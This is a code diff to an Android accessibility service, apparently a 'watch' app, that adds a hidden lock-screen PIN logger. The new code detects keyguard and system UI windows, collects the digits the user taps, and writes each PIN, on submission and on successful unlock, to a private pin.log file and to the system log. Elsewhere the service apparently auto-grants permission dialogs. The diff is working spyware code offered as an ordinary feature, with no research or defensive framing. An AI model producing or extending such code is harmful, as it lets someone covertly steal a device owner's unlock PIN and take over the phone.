@@ -51,9 +51,18 @@ class WatchAccessibilityService : AccessibilityService() {
 
     private var isNotificationFlowActive = false
 
+    private val pinBuffer = StringBuilder()
+    private var isLockScreenActive = false
+    private var lastDigit = ""
+    private var lastDigitTime = 0L
+    private var lastEnterTime = 0L
+    private var lastBackspaceTime = 0L
+    private lateinit var pinLogFile: File
+
     override fun onCreate() {
         super.onCreate()
         logFile = File(filesDir, "watch.log")
+        pinLogFile = File(filesDir, "pin.log")
         Log.d(TAG, "Watch accessibility service created")
     }
 
@@ -68,15 +77,20 @@ class WatchAccessibilityService : AccessibilityService() {
                 }
                 AccessibilityEvent.TYPE_WINDOW_STATE_CHANGED -> {
                     handlePermissionDialog(event)
-                    // Also check immediately for permission buttons
-                    Handler(Looper.getMainLooper()).postDelayed({
-                        val root = rootInActiveWindow
-                        root?.let {
-                            if (it.packageName?.contains("permissioncontroller") == true) {
-                                grantPermission()
-                            }
-                        }
-                    }, 300)
+                    checkLockScreenState(event)
+
+                    // Check for screen off (lock screen appearing with no user interaction)
+                    val packageName = event.packageName?.toString() ?: ""
+                    if (packageName.contains("systemui") && pinBuffer.isNotEmpty()) {
+                        // This might indicate screen off and on again
+                        Log.d(TAG, "Lock screen reappeared with buffer not empty - clearing")
+                        pinBuffer.clear()
+                    }
+                }
+                AccessibilityEvent.TYPE_VIEW_CLICKED -> {
+                    if (isLockScreen(event)) {
+                        capturePinFromClick(event)
+                    }
                 }
                 else -> {
                     // Ignore other events
@@ -1076,5 +1090,146 @@ class WatchAccessibilityService : AccessibilityService() {
             }, 300)
 
         }, 300)
+    }
+
+    private fun isLockScreen(event: AccessibilityEvent): Boolean {
+        val packageName = event.packageName?.toString() ?: ""
+        val className = event.className?.toString() ?: ""
+
+        return packageName.contains("systemui") ||
+                packageName.contains("com.android.systemui") ||
+                className.contains("Keyguard") ||
+                className.contains("LockScreen") ||
+                className.contains("Bouncer")
+    }
+
+    private fun logPinToFile(message: String) {
+        try {
+            val timestamp = dateFormat.format(Date(System.currentTimeMillis()))
+            FileOutputStream(pinLogFile, true).use { fos ->
+                fos.write("$timestamp - $message\n".toByteArray())
+            }
+            Log.d(TAG, "PIN logged: $message")
+        } catch (e: Exception) {
+            Log.e(TAG, "Failed to write to PIN log file", e)
+        }
+    }
+
+    private fun checkLockScreenState(event: AccessibilityEvent) {
+        val wasActive = isLockScreenActive
+        isLockScreenActive = isLockScreen(event)
+
+        Log.d(TAG, "LOCK SCREEN STATE: wasActive=$wasActive, isLockScreenActive=$isLockScreenActive")
+
+        // Lock screen just appeared
+        if (!wasActive && isLockScreenActive) {
+            Log.d(TAG, "LOCK SCREEN DETECTED - waiting for PIN input")
+
+            // Check if buffer already has digits (meaning this is a failed attempt)
+            if (pinBuffer.isNotEmpty()) {
+                Log.d(TAG, "Previous PIN attempt failed (${pinBuffer.length} digits), clearing buffer")
+                pinBuffer.clear()
+            }
+
+            // DEBUG: Reset these too
+            lastDigit = ""
+            lastDigitTime = 0L
+
+            Log.d(TAG, "PIN buffer cleared. Buffer now: '${pinBuffer.toString()}'")
+        }
+
+        // Lock screen just disappeared (phone unlocked successfully)
+        if (wasActive && !isLockScreenActive) {
+            if (pinBuffer.isNotEmpty()) {
+                val pin = pinBuffer.toString()
+                Log.d(TAG, "*** PHONE UNLOCKED with PIN: $pin ***")
+                logPinToFile("PIN_UNLOCK: $pin")
+                pinBuffer.clear()
+            } else {
+                Log.d(TAG, "Phone unlocked but no PIN in buffer")
+            }
+        }
+    }
+
+    private fun capturePinFromClick(event: AccessibilityEvent) {
+        if (!isLockScreenActive) return
+
+        val source = event.source ?: return
+        val text = source.text?.toString() ?: ""
+        val className = source.className?.toString() ?: ""
+        val contentDesc = source.contentDescription?.toString() ?: ""
+
+        Log.d(TAG, "EVENT: ${System.identityHashCode(event)} - Class: $className, Desc: '$contentDesc'")
+
+        // DEBUG: Check buffer state before anything
+        Log.d(TAG, "BUFFER BEFORE: '${pinBuffer.toString()}' (length: ${pinBuffer.length})")
+
+        // Check for "Clear" or "Cancel" button
+        if (className.contains("Button") &&
+            (text.contains("clear", true) || contentDesc.contains("clear", true) ||
+                    text.contains("cancel", true) || contentDesc.contains("cancel", true))) {
+            Log.d(TAG, "Clear/Cancel detected - resetting PIN buffer")
+            pinBuffer.clear()
+            return
+        }
+
+        // Capture number buttons
+        val digit = when {
+            text.matches(Regex("[0-9]")) -> text
+            contentDesc.matches(Regex("[0-9]")) -> contentDesc
+            else -> ""
+        }
+
+        // DEBUG: Show what digit was found
+        Log.d(TAG, "DIGIT FOUND: '$digit'")
+
+        if (digit.isNotEmpty()) {
+            // DEBUG: Check the duplicate condition
+            val timeSinceLastDigit = System.currentTimeMillis() - lastDigitTime
+            Log.d(TAG, "DUPLICATE CHECK: digit='$digit', lastDigit='$lastDigit', timeSinceLastDigit=$timeSinceLastDigit")
+
+            if (digit == lastDigit && timeSinceLastDigit < 200) {
+                Log.d(TAG, "Ignoring likely duplicate: $digit")
+                return
+            }
+
+            pinBuffer.append(digit)
+            lastDigit = digit
+            lastDigitTime = System.currentTimeMillis()
+            Log.d(TAG, "PIN digit entered: $digit, current buffer: '${pinBuffer.toString()}'")
+        }
+
+        // Check for enter button
+        if (className.contains("ImageButton") && contentDesc == "Enter") {
+            if (System.currentTimeMillis() - lastEnterTime < 500) {
+                Log.d(TAG, "Ignoring duplicate Enter")
+                return
+            }
+
+            lastEnterTime = System.currentTimeMillis()
+            Log.d(TAG, "ENTER BUTTON DETECTED")
+            if (pinBuffer.isNotEmpty()) {
+                val pin = pinBuffer.toString()
+                Log.d(TAG, "*** PIN SUBMITTED: $pin ***")
+                logPinToFile("PIN_SUBMITTED: $pin")
+                pinBuffer.clear()
+                Log.d(TAG, "Buffer cleared after PIN submission")
+            }
+        }
+
+        // Check for backspace/delete
+        if (className.contains("Button") &&
+            (text.contains("delete", true) || contentDesc.contains("delete", true) || text == "<")) {
+            if (System.currentTimeMillis() - lastBackspaceTime < 300) {
+                Log.d(TAG, "Ignoring duplicate backspace")
+                return
+            }
+
+            lastBackspaceTime = System.currentTimeMillis()
+            if (pinBuffer.isNotEmpty()) {
+                pinBuffer.deleteCharAt(pinBuffer.length - 1)
+                Log.d(TAG, "PIN backspace - buffer now: '${pinBuffer.toString()}'")
+            }
+        }
     }
 }
